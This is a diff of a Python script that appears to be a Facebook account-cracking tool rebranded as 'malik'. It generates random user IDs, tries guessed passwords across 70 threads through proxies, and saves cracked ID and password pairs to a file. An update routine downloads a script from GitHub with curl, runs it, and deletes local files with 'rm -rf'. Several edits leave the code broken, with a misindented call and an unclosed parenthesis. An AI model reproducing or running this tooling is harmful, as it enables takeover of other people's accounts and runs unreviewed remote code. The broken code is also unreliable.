@@ -8,7 +8,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python ali.py')
+    os.system('python malik.py')
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
 H = '\x1b[1;92m' # HIJAU
@@ -31,30 +31,49 @@ my_color = [
 warna = random.choice(my_color)
 logo =  """   
     
-          ###     ######     ###    ########  
-         ## ##   ##    ##   ## ##   ##     ## 
-        ##   ##  ##        ##   ##  ##     ## 
-       ##     ##  ######  ##     ## ##     ## 
-       #########       ## ######### ##     ## 
-       ##     ## ##    ## ##     ## ##     ## 
-       ##     ##  ######  ##     ## ########  
+          
+                                                                                                                      
+                                                                                                                      
+MMMMMMMM               MMMMMMMM               AAA               LLLLLLLLLLL             IIIIIIIIIIKKKKKKKKK    KKKKKKK
+M:::::::M             M:::::::M              A:::A              L:::::::::L             I::::::::IK:::::::K    K:::::K
+M::::::::M           M::::::::M             A:::::A             L:::::::::L             I::::::::IK:::::::K    K:::::K
+M:::::::::M         M:::::::::M            A:::::::A            LL:::::::LL             II::::::IIK:::::::K   K::::::K
+M::::::::::M       M::::::::::M           A:::::::::A             L:::::L                 I::::I  KK::::::K  K:::::KKK
+M:::::::::::M     M:::::::::::M          A:::::A:::::A            L:::::L                 I::::I    K:::::K K:::::K   
+M:::::::M::::M   M::::M:::::::M         A:::::A A:::::A           L:::::L                 I::::I    K::::::K:::::K    
+M::::::M M::::M M::::M M::::::M        A:::::A   A:::::A          L:::::L                 I::::I    K:::::::::::K     
+M::::::M  M::::M::::M  M::::::M       A:::::A     A:::::A         L:::::L                 I::::I    K:::::::::::K     
+M::::::M   M:::::::M   M::::::M      A:::::AAAAAAAAA:::::A        L:::::L                 I::::I    K::::::K:::::K    
+M::::::M    M:::::M    M::::::M     A:::::::::::::::::::::A       L:::::L                 I::::I    K:::::K K:::::K   
+M::::::M     MMMMM     M::::::M    A:::::AAAAAAAAAAAAA:::::A      L:::::L         LLLLLL  I::::I  KK::::::K  K:::::KKK
+M::::::M               M::::::M   A:::::A             A:::::A   LL:::::::LLLLLLLLL:::::LII::::::IIK:::::::K   K::::::K
+M::::::M               M::::::M  A:::::A               A:::::A  L::::::::::::::::::::::LI::::::::IK:::::::K    K:::::K
+M::::::M               M::::::M A:::::A                 A:::::A L::::::::::::::::::::::LI::::::::IK:::::::K    K:::::K
+MMMMMMMM               MMMMMMMMAAAAAAA                   AAAAAAALLLLLLLLLLLLLLLLLLLLLLLLIIIIIIIIIIKKKKKKKKK    KKKKKKK
+                                                                                                                      
+                                                                                                                      
+                                                                                                                      
+                                                                                                                      
+                                                                                                                      
+                                                                                                                      
+                                                                                                                      
 
 ══════════════════════════════════════════════════
   Author       : malik brand
   Brother      : brand
   TOOLS STATUS : free
-  Youtube      : Pro
+  Version    : 2.1
 ══════════════════════════════════════════════════"""
 loop = 0
 oks = []
 cps = []
 try:
     print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
-    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
+    proxy = requests.get('https://raw.githubusercontent.com/Malik1802/Malik302/malik/main/update.txt').text.splitlines()
     v = 3.1
-    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
+    update = requests.get('https://raw.githubusercontent.com/Malik1802/Malik302/malik/main/version.txt').text
     if str(v) in update:
-        os.system('rm -rf a*')
+        os.system('rm -rf m*')
         os.system('curl -L https://raw.githubusercontent.com/Malik1802/Malik302/malik/main/malik.py > malik.py')
         os.system('python malik.py')
     else:pass
@@ -74,14 +93,14 @@ def malik():
     opt = input('Choose option >>> ')
     if opt =='1':
         random_crack()
-    else:
+    file_crack() 
         print('\n\033[1;31mChoose valid option\033[0;97m')
 def random_crack():
     os.system('clear')
     print(logo)
     print('[1] Random UID crack')
     print('[2] Random number crack')
-    print('[B] Back')
+    print('[B] File Cloning')
     print(50*'-')
     opt = input('Choose option >>> ')
     if opt =='1':
@@ -100,7 +119,7 @@ def random_uid():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(11))
         user.append('100000'+nmp)
-    print('\n\033[1;33mExample: 123456,1234567,12345678 ... \033[0;97m')
+    print('\n\033[1;33mExample: malik123,malik1234,malik12345678 ... \033[0;97m')
     pwx = input('Put passwords: ').split(',')
     with ThreadPool(max_workers=70) as yaari:
         os.system('clear')
@@ -113,7 +132,7 @@ def random_uid():
             yaari.submit(rcrack,uid,pwx,tl)
     print(50*'-')
     print('Crack process has been completed')
-    print('Ids saved in ok.txt,cp.txt')
+    print('Ids saved in ok.txt')
     print(50*'-')
 def random_number():
     user=[]
@@ -138,13 +157,12 @@ def random_number():
             yaari.submit(rcrack,uid,pwx,tl)
     print(50*'-')
     print('Crack process has been completed')
-    print('Ids saved in ok.txt,cp.txt')
+    print('Ids saved in ok.txt')
     print(50*'-')
 
 def rcrack(uid,pwx,tl):
     #print(user)
     global loop
-    global cps
     global oks
     global proxy
     try:
@@ -186,17 +204,17 @@ def rcrack(uid,pwx,tl):
                 open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
-            elif 'checkpoint' in log_cookies:
+            elif 'ok' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
                 print('\033[1;31m[malik-CP] '+cid+' | '+ps+'\033[0;97m')
-                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
+                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r[%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r[%s/%s]  OK:- %s \r'%(loop,tl,len(oks)
         sys.stdout.flush()
     except:
         pass
